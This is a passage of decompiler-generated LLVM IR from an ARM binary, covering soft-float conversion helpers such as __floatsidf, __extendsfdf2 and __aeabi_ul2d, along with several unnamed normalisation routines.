  %v7_1a008 = zext i1 %v3_1a008 to i32
  %v8_1a008 = add i32 %v7_1a008, %v6_1a008
  %v1_1a00c = load i32, i32* @r5, align 4
  %v2_1a00c = or i32 %v1_1a00c, %v8_1a008
  store i32 %v2_1a00c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1a00c

dec_label_pc_1a014:                               ; preds = %dec_label_pc_19fd0
  %v0_1a014 = load i32, i32* @ip, align 4
  %v1_1a014 = icmp slt i32 %v0_1a014, 0
  %v2_1a014 = mul i32 %v0_1a014, 2
  store i32 %v2_1a014, i32* @ip, align 4
  %v0_1a018 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a018 = mul i32 %v0_1a018, 2
  %v4_1a018 = zext i1 %v1_1a014 to i32
  %v5_1a018 = or i32 %v3_1a018, %v4_1a018
  store i32 %v5_1a018, i32* %r1.global-to-local, align 4
  %v9_1a018 = icmp ule i32 %v5_1a018, %v0_1a018
  %v10_1a018 = icmp ult i32 %v3_1a018, %v0_1a018
  %v11_1a018 = select i1 %v1_1a014, i1 %v9_1a018, i1 %v10_1a018
  %v3_1a01c = mul i32 %arg1, 2
  %v4_1a01c = zext i1 %v11_1a018 to i32
  %v5_1a01c = or i32 %v4_1a01c, %v3_1a01c
  store i32 %v5_1a01c, i32* %r0.global-to-local, align 4
  %v1_1a020 = and i32 %v3_1a01c, 1048576
  %v2_1a020 = icmp eq i32 %v1_1a020, 0
  %v0_1a024 = load i32, i32* @r4, align 4
  %v1_1a024 = add i32 %v0_1a024, -1
  store i32 %v1_1a024, i32* @r4, align 4
  br i1 %v2_1a020, label %bb7, label %dec_label_pc_19ffc

bb7:                                              ; preds = %dec_label_pc_1a014
  ret i32 %v5_1a01c

; uselistorder directives
  uselistorder i32 %v0_1a018, { 1, 2, 0 }
  uselistorder i1 %v1_1a014, { 1, 0 }
  uselistorder i32 %v1_1a000, { 1, 0 }
  uselistorder i32 %v0_19ffc, { 1, 0 }
  uselistorder i32 %v0_19fe8, { 1, 0, 2 }
  uselistorder i32 %v0_19fe4, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_19ffc._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_19ffc, { 0, 2, 1 }
}

define i32 @function_1a02c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a02c:
  %v2_1a02c = icmp eq i32 %arg1, 0
  br i1 %v2_1a02c, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_1a02c
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_1a02c
  %v1_1a03810 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_1a094 = phi i32 [ %arg1, %bb ], [ %v1_1a03810, %bb35 ]
  %v1_1a04c = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_1a044 = icmp ugt i32 %v0_1a094, 65535
  br i1 %v2_1a044, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_1a048 = and i32 %v0_1a094, 32768
  %v3_1a048 = icmp eq i32 %v2_1a048, 0
  %v4_1a048 = udiv i32 %v0_1a094, 65536
  br i1 %v3_1a048, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_1a04c = add nsw i32 %v1_1a04c, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_1a058 = phi i32 [ %v1_1a04c, %.thread ], [ %v1_1a04c, %bb36 ], [ %v2_1a04c, %bb37 ]
  %v1_1a054 = phi i32 [ %v0_1a094, %.thread ], [ %v4_1a048, %bb36 ], [ %v4_1a048, %bb37 ]
  %v2_1a050 = icmp ugt i32 %v1_1a054, 255
  br i1 %v2_1a050, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_1a054 = and i32 %v1_1a054, 128
  %v3_1a054 = icmp eq i32 %v2_1a054, 0
  %v4_1a054 = udiv i32 %v1_1a054, 256
  br i1 %v3_1a054, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_1a058 = add nsw i32 %v1_1a058, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_1a064 = phi i32 [ %v1_1a058, %.thread3 ], [ %v1_1a058, %bb38 ], [ %v2_1a058, %bb39 ]
  %v1_1a060 = phi i32 [ %v1_1a054, %.thread3 ], [ %v4_1a054, %bb38 ], [ %v4_1a054, %bb39 ]
  %v2_1a05c = icmp ugt i32 %v1_1a060, 15
  br i1 %v2_1a05c, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_1a060 = and i32 %v1_1a060, 8
  %v3_1a060 = icmp eq i32 %v2_1a060, 0
  %v4_1a060 = udiv i32 %v1_1a060, 16
  br i1 %v3_1a060, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_1a064 = add nsw i32 %v1_1a064, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_1a06c = phi i32 [ %v1_1a064, %.thread4 ], [ %v1_1a064, %bb40 ], [ %v2_1a064, %bb41 ]
  %v1_1a074 = phi i32 [ %v1_1a060, %.thread4 ], [ %v4_1a060, %bb40 ], [ %v4_1a060, %bb41 ]
  %v2_1a068 = icmp ugt i32 %v1_1a074, 3
  br i1 %v2_1a068, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_1a06c = add i32 %v1_1a06c, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_1a070 = udiv i32 %v1_1a074, 2
  %v6_1a070 = sub i32 %v1_1a06c, %v5_1a070
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_1a074 = phi i32 [ %v6_1a070, %.thread6 ], [ %v2_1a06c, %bb42 ]
  %v4_1a074 = udiv i32 %v1_1a074, 8
  %v5_1a074 = sub i32 %v0_1a074, %v4_1a074
  %v2_1a078 = add i32 %v5_1a074, -32
  %v4_1a078 = sub i32 31, %v5_1a074
  %v5_1a078 = and i32 %v4_1a078, %v5_1a074
  %v8_1a078 = icmp eq i32 %v5_1a074, 32
  %v6_1a07c = icmp slt i32 %v5_1a074, 32
  br i1 %v6_1a07c, label %dec_label_pc_1a080, label %dec_label_pc_1a0a0

dec_label_pc_1a080:                               ; preds = %bb43
  %v2_1a080 = add i32 %v5_1a074, -20
  %v7_1a084 = icmp sgt i32 %v2_1a078, -12
  br i1 %v7_1a084, label %dec_label_pc_1a088, label %dec_label_pc_1a09c

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a080
  %v1_1a08c = sub i32 32, %v5_1a074
  %v6_1a090 = shl i32 %v0_1a094, %v5_1a074
  store i32 %v6_1a090, i32* @r1, align 4
  %v6_1a094 = lshr i32 %v0_1a094, %v1_1a08c
  br label %.thread31

dec_label_pc_1a09c:                               ; preds = %dec_label_pc_1a080
  %v8_1a080 = icmp eq i32 %v2_1a080, 0
  %v4_1a080 = add i32 %v5_1a074, 2147483616
  %v5_1a080 = and i32 %v2_1a080, %v4_1a080
  br label %dec_label_pc_1a0a0

dec_label_pc_1a0a0:                               ; preds = %bb43, %dec_label_pc_1a09c
  %v1_1a0ac.in = phi i32 [ %v2_1a078, %bb43 ], [ %v2_1a080, %dec_label_pc_1a09c ]
  %v6_1a0ac = phi i32 [ %v2_1a078, %bb43 ], [ %v5_1a074, %dec_label_pc_1a09c ]
  %v2_1a0ac.in = phi i32 [ %v5_1a078, %bb43 ], [ %v5_1a080, %dec_label_pc_1a09c ]
  %v0_1a0ac = phi i1 [ %v8_1a078, %bb43 ], [ %v8_1a080, %dec_label_pc_1a09c ]
  %v1_1a0ac = icmp slt i32 %v1_1a0ac.in, 0
  %v2_1a0ac = icmp slt i32 %v2_1a0ac.in, 0
  %v3_1a0a0 = xor i1 %v2_1a0ac, %v1_1a0ac
  %v4_1a0a0 = or i1 %v0_1a0ac, %v3_1a0a0
  br i1 %v4_1a0a0, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_1a0a0
  %v6_1a0a0 = sub i32 32, %v6_1a0ac
  store i32 %v6_1a0a0, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1a0a0, %bb44
  %v6_1a0a4 = shl i32 %v0_1a094, %v6_1a0ac
  br i1 %v4_1a0a0, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_1a0a8 = load i32, i32* @r1, align 4
  %v7_1a0a8 = load i32, i32* @ip, align 4
  %v12_1a0a8 = lshr i32 %v6_1a0a8, %v7_1a0a8
  %v13_1a0a8 = or i32 %v12_1a0a8, %v6_1a0a4
  %v11_1a0ac = shl i32 %v6_1a0a8, %v6_1a0ac
  store i32 %v11_1a0ac, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_1a088, %bb46
  %v1_1a0f8 = phi i32 [ %v6_1a094, %dec_label_pc_1a088 ], [ %v13_1a0a8, %bb46 ], [ %v6_1a0a4, %bb45 ]
  %v0_1a0b0 = load i32, i32* @r4, align 4
  %v2_1a0b0 = sub i32 %v0_1a0b0, %v5_1a074
  %v5_1a0b4 = icmp slt i32 %v0_1a0b0, %v5_1a074
  br i1 %v5_1a0b4, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_1a0b4 = mul i32 %v2_1a0b0, 1048576
  %v11_1a0b4 = add i32 %v10_1a0b4, %v1_1a0f8
  %v7_1a0b8 = load i32, i32* @r5, align 4
  %v8_1a0b8 = or i32 %v7_1a0b8, %v11_1a0b4
  ret i32 %v8_1a0b8

bb48:                                             ; preds = %.thread31
  %v2_1a0c4 = sub i32 -32, %v2_1a0b0
  %v6_1a0c8 = icmp sgt i32 %v2_1a0b0, -32
  br i1 %v6_1a0c8, label %dec_label_pc_1a0cc, label %dec_label_pc_1a104

dec_label_pc_1a0cc:                               ; preds = %bb48
  %v1_1a0cc = add i32 %v2_1a0c4, 12
  %v8_1a0d0 = icmp sgt i32 %v1_1a0cc, 0
  br i1 %v8_1a0d0, label %dec_label_pc_1a0ec, label %dec_label_pc_1a0d4

dec_label_pc_1a0d4:                               ; preds = %dec_label_pc_1a0cc
  %v1_1a0d4 = add i32 %v2_1a0c4, 32
  %v0_1a0e4 = load i32, i32* @r5, align 4
  %v7_1a0e4 = lshr i32 %v1_1a0f8, %v1_1a0d4
  %v8_1a0e4 = or i32 %v0_1a0e4, %v7_1a0e4
  ret i32 %v8_1a0e4

dec_label_pc_1a0ec:                               ; preds = %dec_label_pc_1a0cc
  %v0_1a0fc = load i32, i32* @r5, align 4
  ret i32 %v0_1a0fc

dec_label_pc_1a104:                               ; preds = %bb48
  %v0_1a108 = load i32, i32* @r5, align 4
  ret i32 %v0_1a108

; uselistorder directives
  uselistorder i32 %v2_1a0b0, { 1, 0, 2 }
  uselistorder i32 %v1_1a0f8, { 1, 0 }
  uselistorder i32 %v6_1a0a4, { 1, 0 }
  uselistorder i32 %v2_1a078, { 1, 0, 2 }
  uselistorder i32 %v5_1a074, { 5, 4, 6, 2, 7, 1, 3, 8, 9, 0, 11, 10 }
  uselistorder i32 %v4_1a060, { 1, 0 }
  uselistorder i32 %v1_1a060, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a054, { 1, 0 }
  uselistorder i32 %v1_1a054, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a048, { 1, 0 }
  uselistorder i32 %v0_1a094, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 -12, { 1, 2, 14, 15, 3, 17, 18, 4, 19, 20, 16, 13, 12, 11, 10, 9, 21, 22, 23, 5, 6, 7, 24, 8, 25, 26, 28, 29, 30, 27, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 13, 2, 4, 5, 3, 14, 7, 6, 12, 8, 15, 17, 16, 18, 0, 9, 1, 10, 19, 11 }
  uselistorder i32 15, { 2, 3, 1, 6, 4, 9, 0, 5, 7, 8 }
  uselistorder i32 -8, { 7, 14, 15, 16, 17, 18, 19, 13, 12, 5, 11, 10, 9, 8, 20, 21, 22, 23, 6, 24, 25, 3, 0, 29, 26, 27, 28, 2, 30, 31, 4, 1 }
  uselistorder i32 128, { 12, 13, 6, 7, 10, 5, 20, 0, 22, 23, 1, 21, 8, 16, 17, 2, 3, 11, 18, 19, 4, 15, 9, 14 }
  uselistorder i32 255, { 9, 10, 13, 1, 12, 0, 11, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0, 23 }
  uselistorder i32 65535, { 2, 3, 1, 4, 0 }
  uselistorder i32 52, { 0, 6, 3, 8, 4, 5, 2, 9, 7, 10, 1 }
  uselistorder i32 20, { 3, 31, 32, 33, 34, 0, 20, 38, 4, 39, 1, 5, 35, 6, 21, 22, 13, 30, 14, 7, 2, 8, 23, 24, 25, 26, 15, 36, 16, 17, 18, 19, 9, 27, 28, 29, 10, 11, 12, 37 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1a0a0, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1a110:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1a110 = load i32, i32* @r4, align 4
  %v2_1a110 = icmp eq i32 %v0_1a110, 0
  %v1_1a114 = xor i32 %arg3, 1048576
  store i32 %v1_1a114, i32* @r2, align 4
  br i1 %v2_1a110, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1a110
  %v2_1a118 = xor i32 %arg1, 1048576
  store i32 %v2_1a118, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1a110
  %v1_1a120 = load i32, i32* @r5, align 4
  %v2_1a120 = add i32 %v1_1a120, -1
  store i32 %v2_1a120, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1a124 = call i32 @function_19f7c()
  %v0_1a128 = load i32, i32* @r4, align 4
  %v0_1a128.off = add i32 %v0_1a128, 4194303
  %tmp = icmp ult i32 %v0_1a128.off, 2097152
  %v1_1a1a4 = load i32, i32* @r5, align 4
  %v1_1a1a4.off = add i32 %v1_1a1a4, 4194303
  %tmp45 = icmp ult i32 %v1_1a1a4.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_1a134

dec_label_pc_1a134:                               ; preds = %bb33
  %v4_1a134 = icmp eq i32 %v1_1a1a4, %v0_1a128
  %v1_1a138 = load i32, i32* @r1, align 4
  br i1 %v4_1a134, label %bb34, label %dec_label_pc_1a140

bb34:                                             ; preds = %dec_label_pc_1a134
  %v2_1a138 = load i32, i32* @r3, align 4
  %v5_1a138 = icmp eq i32 %v2_1a138, %v1_1a138
  br i1 %v5_1a138, label %dec_label_pc_1a150, label %dec_label_pc_1a140

dec_label_pc_1a140:                               ; preds = %dec_label_pc_1a134, %bb34
  %v2_1a140 = or i32 %v1_1a138, %v0_1a128
  %v4_1a140 = icmp eq i32 %v2_1a140, 0
  br i1 %v4_1a140, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_1a140
  %v1_1a144 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1a140, %bb35
  %v11_1a14c = phi i32 [ %v0_1a124, %dec_label_pc_1a140 ], [ %v1_1a144, %bb35 ]
  ret i32 %v11_1a14c

dec_label_pc_1a150:                               ; preds = %bb34
  %v1_1a150 = load i32, i32* @r2, align 4
  %v4_1a150 = icmp eq i32 %v1_1a150, %v0_1a124
  br i1 %v4_1a150, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_1a150
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_1a150
  %tmp46 = icmp ult i32 %v0_1a128, 2097152
  br i1 %tmp46, label %dec_label_pc_1a168, label %dec_label_pc_1a178

dec_label_pc_1a168:                               ; preds = %.thread8
  %v1_1a168 = icmp slt i32 %v1_1a138, 0
  %v3_1a16c = mul i32 %v0_1a124, 2
  %v4_1a16c = zext i1 %v1_1a168 to i32
  %v5_1a16c = or i32 %v4_1a16c, %v3_1a16c
  %v9_1a16c = icmp ule i32 %v5_1a16c, %v0_1a124
  %v10_1a16c = icmp ult i32 %v3_1a16c, %v0_1a124
  %v11_1a16c = select i1 %v1_1a168, i1 %v9_1a16c, i1 %v10_1a16c
  br i1 %v11_1a16c, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_1a168
  %v2_1a170 = or i32 %v5_1a16c, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_1a168, %bb37
  %v11_1a174 = phi i32 [ %v5_1a16c, %dec_label_pc_1a168 ], [ %v2_1a170, %bb37 ]
  ret i32 %v11_1a174

dec_label_pc_1a178:                               ; preds = %.thread8
  %v2_1a178 = icmp ugt i32 %v0_1a128, -4194305
  br i1 %v2_1a178, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_1a178
  %v2_1a17c = add i32 %v0_1a124, 1048576
  ret i32 %v2_1a17c

.thread9:                                         ; preds = %dec_label_pc_1a178
  %v1_1a184 = and i32 %v0_1a124, -2147483648
  %v1_1a18c = or i32 %v1_1a184, 2146435072
  ret i32 %v1_1a18c

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_1a1b0.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_1a124, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_1a19c = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_1a1b027 = phi i32 [ %v0_1a124, %.thread14 ], [ %v1_1a19c, %bb40 ]
  %v1_1a1ac.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_1a1ac = load i32, i32* %v1_1a1ac.in, align 4
  store i32 %v1_1a1ac, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_1a1bc = phi i32 [ %v0_1a124, %.thread11..thread13_crit_edge ], [ %v1_1a1b027, %bb41 ]
  %v0_1a1b0 = phi i32 [ %v0_1a1b0.pre, %.thread11..thread13_crit_edge ], [ %v1_1a1ac, %bb41 ]
  %v4_1a1b0 = mul i32 %v1_1a1bc, 4096
  %v5_1a1b0 = or i32 %v4_1a1b0, %v0_1a1b0
  %v7_1a1b0 = icmp eq i32 %v5_1a1b0, 0
  br i1 %v7_1a1b0, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_1a1b4 = load i32, i32* @r3, align 4
  %v2_1a1b4 = load i32, i32* @r2, align 4
  %v5_1a1b4 = mul i32 %v2_1a1b4, 4096
  %v6_1a1b4 = or i32 %v5_1a1b4, %v1_1a1b4
  %v8_1a1b4 = icmp eq i32 %v6_1a1b4, 0
  br i1 %v8_1a1b4, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_1a1b8 = icmp eq i32 %v2_1a1b4, %v1_1a1bc
  br i1 %v5_1a1b8, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_1a1bc = or i32 %v1_1a1bc, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_1a1c0 = phi i32 [ %v1_1a1bc, %bb43 ], [ %v2_1a1bc, %.thread17 ]
  ret i32 %v11_1a1c0

; uselistorder directives
  uselistorder i32 %v1_1a1bc, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1a1ac, { 1, 0 }
  uselistorder i1 %v1_1a168, { 1, 0 }
  uselistorder i32 %v1_1a138, { 2, 1, 0 }
  uselistorder i32 %v0_1a128, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_1a124, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1a140, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1a1c4 = icmp eq i32 %arg1, 0
  br i1 %v2_1a1c4, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_1a1e8 = call i32 @function_1a02c(i32 0)
  ret i32 %v1_1a1e8
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1a1ec = icmp eq i32 %arg1, 0
  br i1 %v2_1a1ec, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  %v1_1a204 = and i32 %arg1, -2147483648
  store i32 %v1_1a204, i32* @r5, align 4
  %v2_1a204 = icmp eq i32 %v1_1a204, 0
  br i1 %v2_1a204, label %bb5, label %bb4

bb4:                                              ; preds = %.thread
  %v2_1a208 = sub i32 0, %arg1
  br label %bb5

bb5:                                              ; preds = %.thread, %bb4
  %v0_1a20c = phi i32 [ %arg1, %.thread ], [ %v2_1a208, %bb4 ]
  store i32 %v0_1a20c, i32* @r1, align 4
  %v1_1a214 = call i32 @function_1a02c(i32 0)
  ret i32 %v1_1a214

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1a218 = mul i32 %arg1, 2
  %v4_1a218 = icmp eq i32 %v2_1a218, 0
  %v1_1a21c = and i32 %v2_1a218, 4
  %v2_1a21c = icmp ne i32 %v1_1a21c, 0
  %v3_1a21c = sdiv i32 %v2_1a218, 8
  %v3_1a220 = zext i1 %v2_1a21c to i32
  %v6_1a220 = zext i32 %v3_1a21c to i64
  %v7_1a220 = sub nsw i32 33, %v3_1a21c
  %v8_1a220 = zext i32 %v7_1a220 to i64
  %v9_1a220 = shl i64 %v6_1a220, %v8_1a220
  %v10_1a220 = sub nsw i32 32, %v3_1a21c
  %v11_1a220 = shl i32 %v3_1a220, %v10_1a220
  %v12_1a220 = zext i32 %v11_1a220 to i64
  %v14_1a220 = or i64 %v12_1a220, %v9_1a220
  %v15_1a220 = trunc i64 %v14_1a220 to i32
  %v3_1a224 = mul i32 %arg1, 536870912
  store i32 %v3_1a224, i32* @r1, align 4
  br i1 %v4_1a218, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_1a228 = icmp ult i32 %v2_1a218, 16777216
  br i1 %v4_1a228, label %bb12, label %bb9

bb9:                                              ; preds = %bb
  %v4_1a23c18 = icmp ugt i32 %v2_1a218, -16777217
  br i1 %v4_1a23c18, label %bb11.thread, label %bb10

bb11.thread:                                      ; preds = %bb9
  br label %.thread3

bb10:                                             ; preds = %bb9
  %v2_1a2306 = xor i32 %v15_1a220, 939524096
  ret i32 %v2_1a2306

.thread2:                                         ; preds = %entry
  br label %.thread3

.thread3:                                         ; preds = %bb11.thread, %.thread2
  ret i32 %v15_1a220

bb12:                                             ; preds = %bb
  store i32 896, i32* @r4, align 4
  %v1_1a24c = and i32 %v15_1a220, -2147483648
  store i32 %v1_1a24c, i32* @r5, align 4
  %tmp = bitcast i32 %v15_1a220 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1a250 = bitcast float %tmp19 to i32
  %v1_1a254 = call i32 @function_1a02c(i32 %v1_1a250)
  ret i32 %v1_1a254

; uselistorder directives
  uselistorder i32 %v15_1a220, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1a21c, { 1, 2, 0 }
  uselistorder i32 %v2_1a218, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @function_1a02c, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1a258 = or i32 %arg2, %arg1
  %v4_1a258 = icmp eq i32 %v2_1a258, 0
  br i1 %v4_1a258, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v0_1a268 = call i32 @function_1a288()
  ret i32 %v0_1a268

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a26c = or i32 %arg2, %arg1
  %v4_1a26c = icmp eq i32 %v2_1a26c, 0
  br i1 %v4_1a26c, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  %v1_1a27c = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1a27c, i32 ptrtoint (i32* @global_var_1a288.1364 to i32))
  %v1_1a280 = sub i32 0, %arg1
  ret i32 %v1_1a280

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_1a288() local_unnamed_addr {
dec_label_pc_1a288:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1a290 = load i32, i32* @r0, align 4
  %v0_1a294 = load i32, i32* @r1, align 4
  store i32 %v0_1a294, i32* %r0.global-to-local, align 4
  store i32 %v0_1a290, i32* %r1.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a294, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_19fd0.1362 to i32))
  %tmp6 = icmp ult i32 %v0_1a294, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1a288
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1a288, %bb
  %v1_1a2b4 = phi i32 [ 3, %dec_label_pc_1a288 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1a294, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1a2b4 = add nuw nsw i32 %v1_1a2b4, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1a2b8 = phi i32 [ %v1_1a2b4, %bb3 ], [ %v2_1a2b4, %bb4 ]
  %not. = icmp slt i32 %v0_1a294, 0
  %v4_1a2b8 = zext i1 %not. to i32
  %v5_1a2b8 = add nsw i32 %v0_1a2b8, %v4_1a2b8
  %v1_1a2bc = sub nsw i32 32, %v5_1a2b8
  %v0_1a2c0 = load i32, i32* %r1.global-to-local, align 4
  %v6_1a2c0 = shl i32 %v0_1a2c0, %v1_1a2bc
  store i32 %v6_1a2c0, i32* @ip, align 4
  %v6_1a2c4 = lshr i32 %v0_1a2c0, %v5_1a2b8
  %v1_1a2c8 = load i32, i32* %r0.global-to-local, align 4
  %v7_1a2c8 = shl i32 %v1_1a2c8, %v1_1a2bc
  %v8_1a2c8 = or i32 %v7_1a2c8, %v6_1a2c4
  store i32 %v8_1a2c8, i32* %r1.global-to-local, align 4
  %v6_1a2cc = lshr i32 %v1_1a2c8, %v5_1a2b8
  store i32 %v6_1a2cc, i32* %r0.global-to-local, align 4
  %v0_1a2d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a2d0 = add i32 %v0_1a2d0, %v5_1a2b8
  store i32 %v2_1a2d0, i32* @r4, align 4
  %v4_1a2d4 = sext i32 %v8_1a2c8 to i64
  %v5_1a2d4 = call i32 @function_19fd0(i32 %v6_1a2cc, i64 %v4_1a2d4, i32 %v5_1a2b8, i32 %v1_1a2bc)
  store i32 %v5_1a2d4, i32* %r0.global-to-local, align 4
  ret i32 %v5_1a2d4

; uselistorder directives
  uselistorder i32 %v5_1a2b8, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 6, { 1, 22, 23, 24, 15, 16, 2, 17, 18, 3, 4, 27, 5, 6, 19, 0, 7, 8, 9, 10, 11, 20, 21, 12, 14, 13, 25, 26 }
